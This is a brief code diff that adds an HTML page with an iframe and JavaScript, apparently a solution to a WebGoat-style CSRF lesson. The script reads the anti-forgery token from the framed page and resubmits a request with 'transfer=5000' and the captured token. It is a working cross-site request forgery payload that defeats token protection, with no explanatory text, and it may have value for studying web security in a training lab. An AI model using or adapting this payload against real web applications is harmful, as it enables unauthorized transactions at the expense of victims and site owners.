@@ -1,0 +1,13 @@
+<script>
+function getToken() {
+tokenValue = document.getElementById("frame").contentDocument.getElementsByName("token")[0].value;
+frame = document.getElementById("frame");
+frame.src = "attack?Screen=1155765443&menu=900&transfer=5000&token="+tokenValue;
+}
+</script>
+
+<iframe id="frame" src='attack?Screen=1155765443&menu=900&transfer=main' width='1000' height='400' border='3'
+onload="getToken()"></iframe>
+
+
+
